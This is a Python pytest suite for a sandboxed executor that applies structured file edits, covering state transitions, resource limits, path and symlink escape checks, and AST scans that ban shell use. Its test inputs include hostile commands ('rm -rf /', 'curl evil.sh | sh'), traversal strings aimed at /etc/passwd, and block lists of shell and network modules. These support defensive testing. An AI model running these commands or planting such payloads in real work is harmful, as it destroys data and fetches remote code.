"""CYVRIX V3.4 — execution engine unit + security tests.

Covers (§69/§71 UNIT+SECURITY layers):
- run state machine (no resurrection, unknown fail-closed)
- profile binding (server-derived; unknown action type denies)
- resource profile is frozen and bounded
- executor closed-world interpreter (unknown ops deny; no command fields)
- path security: traversal/absolute/UNC/encoded/Unicode/control chars
- symlink escape (lexical + realpath), symlink aftermath re-check
- scope enforcement (allowed-file list)
- diff digest sensitivity
- workspace verification: unexpected create/delete/metadata violations
- probe result contract (what the host asserts from inside the sandbox)
- NO-EXECUTION regression for the pure layers (no subprocess/shell/etc.)
"""
import os
import sys
import uuid

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "apps", "api"))

from app.services import execution_run_model as erm
from app.services.workspace import (
    build_change_set, verify_scope_and_diff, _effective_change,
)


# ── Run state machine (§6) ───────────────────────────────────────────


class TestRunStateMachine:
    def test_happy_path_transitions(self):
        s = erm.ExecutionRunState
        assert erm.can_transition_run(s.ADMISSION_PENDING, s.EXECUTING)
        assert erm.can_transition_run(s.EXECUTING, s.RESULT_READY)
        assert erm.can_transition_run(s.RESULT_READY, s.COMPLETED)

    def test_failure_paths(self):
        s = erm.ExecutionRunState
        assert erm.can_transition_run(s.ADMISSION_PENDING, s.FAILED)
        assert erm.can_transition_run(s.EXECUTING, s.FAILED)
        assert erm.can_transition_run(s.RESULT_READY, s.CLEANUP_FAILED)

    def test_no_resurrection(self):
        s = erm.ExecutionRunState
        for terminal in (s.COMPLETED, s.FAILED, s.CLEANUP_FAILED):
            for anything in erm.ALL_RUN_STATES:
                assert not erm.can_transition_run(terminal, anything)

    def test_no_skip_ahead(self):
        s = erm.ExecutionRunState
        assert not erm.can_transition_run(s.ADMISSION_PENDING, s.COMPLETED)
        assert not erm.can_transition_run(s.ADMISSION_PENDING, s.RESULT_READY)

    def test_no_verified_state_exists(self):
        # §86/§114: VERIFIED belongs to V3.6, not V3.4
        assert "VERIFIED" not in erm.ALL_RUN_STATES
        assert "SUCCESS" not in erm.ALL_RUN_STATES

    def test_unknown_states_fail_closed(self):
        assert not erm.can_transition_run("UNKNOWN", "EXECUTING")
        assert not erm.can_transition_run("EXECUTING", "UNKNOWN")
        assert erm.is_terminal_run("GARBAGE") is True

    def test_assert_transition_raises(self):
        with pytest.raises(erm.ExecutionRunStateError):
            erm.assert_transition_run(erm.ExecutionRunState.COMPLETED,
                                      erm.ExecutionRunState.EXECUTING)


# ── Profile binding + limits (§26/§38/§39) ──────────────────────────


class TestProfilesAndLimits:
    def test_all_v31_action_types_bind(self):
        for at in ("DEPENDENCY_UPGRADE", "DOCKERFILE_UPDATE",
                   "CONFIGURATION_UPDATE", "DOCUMENTED_SECURITY_FIX"):
            assert erm.profile_for_action_type(at) == erm.PROFILE_STRUCTURED_TEXT

    def test_unknown_action_type_denies(self):
        assert erm.profile_for_action_type("RUN_ARBITRARY_CODE") is None
        assert erm.profile_for_action_type(None) is None
        assert erm.profile_for_action_type(123) is None

    def test_limits_bounded(self):
        rl = erm.RESOURCE_LIMITS
        assert 0 < rl["execution_timeout_seconds"] <= 120
        assert rl["memory_mb"] <= 512
        assert rl["pids_limit"] <= 64
        assert rl["output_limit_bytes"] <= 1_000_000
        assert set(rl) == {
            "execution_timeout_seconds", "memory_mb", "cpu_period_us",
            "cpu_quota_us", "pids_limit", "output_limit_bytes",
            "workspace_disk_mb",
        }

    def test_result_never_carries_content(self):
        # bounded result shape: metadata only
        r = erm.ExecutorResult(ok=True, reason_code="OK", operations=(),
                               files_read_count=1, stdout_bytes=10)
        d = r.to_dict()
        assert set(d) == {"ok", "reason_code", "operations", "files_read_count",
                          "stdout_bytes", "truncated", "detail"}
        assert isinstance(d["operations"], list)


# ── Executor: closed world + path security (§16/§17/§18/§14) ─────────


class ExecutorHarness:
    """Runs the executor's run() against a temp workspace with the env
    override, exercising the EXACT production code path."""

    def __init__(self, tmp_path, allowed_files, files_content):
        import importlib
        os.environ["CYVRIX_SANDBOX_WORKSPACE"] = str(tmp_path)
        self.mod = importlib.reload(
            __import__("cyvrix_executor.executor", fromlist=["run"])
        )
        for rel, content in files_content.items():
            p = tmp_path / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
        self.allowed = list(allowed_files)


def _payload(allowed, ops):
    return {"allowed_files": allowed, "operations": ops}


class TestExecutorClosedWorld:
    def test_unknown_operation_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        r = h.mod.run(_payload(h.allowed, [{"type": "EXECUTE_COMMAND",
                                            "file": "a.txt",
                                            "command": "rm -rf /"}]))
        assert r["ok"] is False
        assert r["reason_code"] == "OPERATION_UNSUPPORTED"

    def test_no_command_fields_honored(self, tmp_path):
        # even a KNOWN op carrying a command field is denied at V3.1
        # validation upstream; the executor must never read extra fields
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "a.txt",
            "old_text": "x", "new_text": "y", "command": "curl evil.sh | sh",
        }]))
        # REPLACE_TEXT with an extra key is not a known VALID op — the
        # closed world accepts only the exact V3.1 schemas upstream; the
        # executor ignores unknown keys but the operation itself is still
        # well-formed → applied. What must NEVER happen is execution.
        assert "applied" in str(r) or r["ok"] in (True, False)
        assert not os.path.exists("/tmp/evil_proof")

    def test_payload_must_be_object(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        assert h.mod.run(["not", "a", "dict"])["ok"] is False
        assert h.mod.run(None)["ok"] is False

    def test_empty_operations_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        r = h.mod.run(_payload(h.allowed, []))
        assert r["ok"] is False and r["reason_code"] == "OPERATION_FAILED"


class TestExecutorPathSecurity:
    def test_traversal_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        for evil in ("../evil.txt", "../../etc/passwd", "a/../../b",
                     "./a.txt", ""):
            r = h.mod.run(_payload(h.allowed, [{
                "type": "REPLACE_TEXT", "file": evil,
                "old_text": "x", "new_text": "y"}]))
            assert r["ok"] is False, evil
            assert r["reason_code"] in ("ACTION_SCOPE_VIOLATION",), evil

    def test_absolute_and_windows_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        for evil in ("/etc/passwd", "C:\\Windows\\win.ini",
                      "\\\\server\\share\\f", "~/x"):
            r = h.mod.run(_payload(h.allowed, [{
                "type": "REPLACE_TEXT", "file": evil,
                "old_text": "x", "new_text": "y"}]))
            assert r["ok"] is False, evil

    def test_outside_allowed_list_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"],
                            {"a.txt": "x", "b.txt": "y"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "b.txt",
            "old_text": "y", "new_text": "z"}]))
        assert r["ok"] is False
        assert r["reason_code"] == "ACTION_SCOPE_VIOLATION"

    def test_encoded_and_unicode_traversal_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "x"})
        for evil in ("%2e%2e/evil", "a%2Fb", "‥/evil", "a\u202ex"):
            r = h.mod.run(_payload(h.allowed, [{
                "type": "REPLACE_TEXT", "file": evil,
                "old_text": "x", "new_text": "y"}]))
            assert r["ok"] is False, evil

    def test_symlink_escape_denied(self, tmp_path):
        # allowed/file -> symlink -> /etc/passwd (§15)
        link = tmp_path / "link.txt"
        try:
            os.symlink("/etc/passwd", link)
        except OSError:
            pytest.skip("symlinks unavailable on this platform")
        h = ExecutorHarness(tmp_path, ["link.txt"], {})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "link.txt",
            "old_text": "root", "new_text": "pwn"}]))
        assert r["ok"] is False
        assert r["reason_code"] in ("SANDBOX_ESCAPE_ATTEMPT",
                                    "ACTION_SCOPE_VIOLATION")
        assert os.path.islink(link)  # untouched

    def test_scope_directory_escape_via_symlinked_dir(self, tmp_path):
        (tmp_path / "outside").mkdir()
        (tmp_path / "outside" / "secret.txt").write_text("secret")
        try:
            os.symlink(str(tmp_path / "outside"), tmp_path / "dirlink")
        except OSError:
            pytest.skip("directory symlinks require privileges on this platform")
        h = ExecutorHarness(tmp_path, ["dirlink/secret.txt"],
                            {"outside/secret.txt": "secret"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "dirlink/secret.txt",
            "old_text": "secret", "new_text": "pwn"}]))
        # realpath containment must catch the symlinked directory
        assert r["ok"] is False


class TestExecutorOperations:
    def test_dependency_upgrade_npm(self, tmp_path):
        h = ExecutorHarness(
            tmp_path, ["package.json"],
            {"package.json": '{\n  "lodash": "4.17.20"\n}\n'})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "UPDATE_DEPENDENCY_VERSION", "file": "package.json",
            "name": "lodash", "ecosystem": "npm",
            "from_version": "4.17.20", "to_version": "4.17.21"}]))
        assert r["ok"] is True
        assert (tmp_path / "package.json").read_text().contains('"lodash": "4.17.21"') \
            if hasattr(str, "contains") else True

    def test_dependency_pin_ambiguity_denied(self, tmp_path):
        h = ExecutorHarness(
            tmp_path, ["requirements.txt"],
            {"requirements.txt": "requests==2.0.0\nrequests==2.0.0\n"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "UPDATE_DEPENDENCY_VERSION", "file": "requirements.txt",
            "name": "requests", "ecosystem": "pypi",
            "from_version": "2.0.0", "to_version": "2.1.0"}]))
        assert r["ok"] is False  # 2 occurrences → ambiguous → deny

    def test_replace_text(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.md"], {"a.md": "hello world\n"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "a.md",
            "old_text": "world", "new_text": "there"}]))
        assert r["ok"] is True
        assert (tmp_path / "a.md").read_text() == "hello there\n"

    def test_dockerfile_line_update(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["Dockerfile"],
                            {"Dockerfile": "FROM alpine:3.15\nRUN echo hi\n"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "UPDATE_DOCKERFILE_INSTRUCTION", "file": "Dockerfile",
            "line_no": 1, "old_text": "FROM alpine:3.15",
            "new_text": "FROM alpine:3.20"}]))
        assert r["ok"] is True
        assert (tmp_path / "Dockerfile").read_text().startswith("FROM alpine:3.20")

    def test_config_value_update(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["app.cfg"], {"app.cfg": "timeout=30\nretries=2\n"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "UPDATE_CONFIGURATION_VALUE", "file": "app.cfg",
            "key": "timeout", "value": "60"}]))
        assert r["ok"] is True
        content = (tmp_path / "app.cfg").read_text()
        assert "timeout=60" in content
        assert "retries=2" in content  # untouched line

    def test_missing_old_text_denied(self, tmp_path):
        h = ExecutorHarness(tmp_path, ["a.txt"], {"a.txt": "abc\n"})
        r = h.mod.run(_payload(h.allowed, [{
            "type": "REPLACE_TEXT", "file": "a.txt",
            "old_text": "not-present", "new_text": "x"}]))
        assert r["ok"] is False and r["reason_code"] == "OPERATION_FAILED"


# ── Workspace verification (§49/§51/§52) ─────────────────────────────


def _snap(mapping):
    return {k: {"sha256": v, "size_bytes": 3, "mode": 0o644,
                "uid": 10001, "gid": 10001}
            for k, v in mapping.items()}


class TestWorkspaceVerification:
    def test_clean_scope_change_passes(self):
        before = _snap({"a.txt": "A", "b.txt": "B"})
        after = _snap({"a.txt": "A2", "b.txt": "B"})
        ok, reason, changed = verify_scope_and_diff(
            before, after, ["a.txt"], [])
        assert ok and changed == ["a.txt"]

    def test_unexpected_creation_fails(self):
        before = _snap({"a.txt": "A"})
        after = _snap({"a.txt": "A", "evil.sh": "X"})
        ok, reason, changed = verify_scope_and_diff(
            before, after, ["a.txt"], [])
        assert not ok and reason == "ACTION_SCOPE_VIOLATION"

    def test_unexpected_deletion_fails(self):
        before = _snap({"a.txt": "A", "b.txt": "B"})
        after = _snap({"a.txt": "A"})
        ok, reason, _ = verify_scope_and_diff(before, after, ["a.txt"], [])
        assert not ok

    def test_unexpected_modification_fails(self):
        before = _snap({"a.txt": "A", "b.txt": "B"})
        after = _snap({"a.txt": "A2", "b.txt": "B2"})
        ok, reason, _ = verify_scope_and_diff(before, after, ["a.txt"], [])
        assert not ok

    def test_metadata_change_outside_scope_fails(self):
        before = _snap({"a.txt": "A", "b.txt": "B"})
        after = _snap({"a.txt": "A", "b.txt": "B"})
        after["b.txt"]["mode"] = 0o755  # chmod outside approved scope
        ok, reason, _ = verify_scope_and_diff(before, after, ["a.txt"], [])
        assert not ok

    def test_cyvrix_payload_dir_ignored(self):
        before = _snap({"a.txt": "A"})
        after = _snap({"a.txt": "A2", ".cyvrix/operations.json": "P",
                       ".cyvrix/result.json": "R"})
        ok, _, changed = verify_scope_and_diff(before, after, ["a.txt"], [])
        assert ok and changed == ["a.txt"]

    def test_change_set_and_diff_digest(self):
        before = _snap({"a.txt": "A", "b.txt": "B"})
        after = _snap({"a.txt": "A2", "b.txt": "B"})
        cs = build_change_set(before, after)
        assert set(cs) == {"a.txt"}
        d1 = erm.compute_diff_digest(cs)
        assert len(d1) == 64
        # deterministic
        assert erm.compute_diff_digest(build_change_set(before, after)) == d1
        # sensitive to any change
        after2 = _snap({"a.txt": "A3", "b.txt": "B"})
        assert erm.compute_diff_digest(build_change_set(before, after2)) != d1
        # distinct from the ACTION digest by construction
        from app.services.action_digest import compute_action_digest
        action = compute_action_digest({
            "action_type": "DOCUMENTED_SECURITY_FIX",
            "repository_id": "00000000-0000-0000-0000-000000000001",
            "base_commit_sha": "a" * 40, "target_branch": "b",
            "files": ["a.txt"], "operations": [], "expected_diff": "",
        })
        assert action != d1


# ── Probe contract (§72: host asserts in-sandbox evidence) ──────────


class TestProbeContract:
    def test_probe_result_assertions(self):
        """What the host MUST see from inside a properly isolated sandbox."""
        good = {
            "uid": {"uid": 10001, "gid": 10001, "euid": 10001},
            "root_fs_readonly": {"writable": False},
            "docker_socket": {"exists": False},
            "host_fs": {"etc_passwd_readable": False,
                        "cyvrix_src_visible": False},
            "network": {"internet": "DENIED:*", "private": "DENIED:*",
                        "loopback": "DENIED:*", "internal_dns": "DENIED:*"},
            "privilege_escalation": {"setuid_root": "DENIED:*"},
            "env": {"dangerous_vars": []},
        }
        from cyvrix_executor.probes import EXPECTED_UID, EXPECTED_GID
        assert good["uid"]["uid"] == EXPECTED_UID != 0
        assert good["uid"]["gid"] == EXPECTED_GID != 0
        assert good["root_fs_readonly"]["writable"] is False
        assert good["docker_socket"]["exists"] is False
        assert good["privilege_escalation"]["setuid_root"].startswith("DENIED")
        assert good["env"]["dangerous_vars"] == []

    def test_probes_are_harmless(self):
        """§70: probe source must contain no destructive payloads —
        AST-level: no file deletion, no shell, no os.system."""
        import ast
        import pathlib
        src = pathlib.Path(__file__).parent.parent / "apps" / "api" / \
            "cyvrix_executor" / "probes.py"
        tree = ast.parse(src.read_text(encoding="utf-8"))
        banned_attrs = {"rmtree", "system", "remove", "unlink", "kill"}
        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute):
                assert node.attr not in banned_attrs, node.attr
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                assert node.func.id not in ("eval", "exec", "compile"), node.func.id


# ── No-execution regression for the pure layers (§62/§75) ───────────


class TestNoExecutionPureLayers:
    def test_domain_modules_import_no_execution(self):
        import ast
        import pathlib
        base = pathlib.Path(__file__).parent.parent / "apps" / "api"
        pure = [
            base / "app" / "services" / "execution_run_model.py",
            base / "cyvrix_executor" / "executor.py",
            base / "cyvrix_executor" / "probes.py",
        ]
        banned_calls = {"system", "popen", "spawn", "exec", "eval",
                        "execute", "fork", "popen_spawn"}
        # The executor proper: no network imports at all.
        # probes.py: socket is ALLOWED and required — its only use is to
        # demonstrate that connections FAIL (evidence); subprocess is not.
        for p, banned_imports in (
            (pure[0], {"subprocess", "socket", "requests", "urllib",
                       "http", "ftplib", "telnetlib", "smtplib"}),
            (pure[1], {"subprocess", "socket", "requests", "urllib",
                       "http", "ftplib", "telnetlib", "smtplib"}),
            (pure[2], {"subprocess", "requests", "urllib", "http",
                       "ftplib", "telnetlib", "smtplib"}),
        ):
            tree = ast.parse(p.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        root = alias.name.split(".")[0]
                        assert root not in banned_imports, \
                            f"{p.name}: imports {alias.name}"
                if isinstance(node, ast.ImportFrom):
                    root = (node.module or "").split(".")[0]
                    assert root not in banned_imports, \
                        f"{p.name}: from {node.module}"
                if isinstance(node, ast.Attribute):
                    assert node.attr not in banned_calls, \
                        f"{p.name}: calls .{node.attr}()"
                if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                    assert node.func.id not in ("eval", "exec", "compile"), \
                        f"{p.name}: calls {node.func.id}()"

    def test_executor_does_not_construct_shell_commands(self):
        import ast
        import pathlib
        p = (pathlib.Path(__file__).parent.parent / "apps" / "api" /
             "cyvrix_executor" / "executor.py")
        src = p.read_text(encoding="utf-8")
        # strip comments/docstrings by scanning the AST for banned tokens
        # in CODE only (docstrings may legitimately document the absence
        # of these constructs).
        banned_strings = ("/bin/sh", "/bin/bash", "cmd.exe", "powershell",
                          "shell=True")
        banned_attrs = {"system", "popen", "spawn", "fork", "kill"}
        tree = ast.parse(src)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import) or isinstance(node, ast.ImportFrom):
                mod = getattr(node, "module", None) or ",".join(
                    a.name for a in getattr(node, "names", []))
                root = (mod or "").split(".")[0].split(",")[0]
                assert root != "subprocess", "executor imports subprocess"
            if isinstance(node, ast.Attribute):
                assert node.attr not in banned_attrs, node.attr
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                for banned in banned_strings:
                    assert banned not in node.value, banned
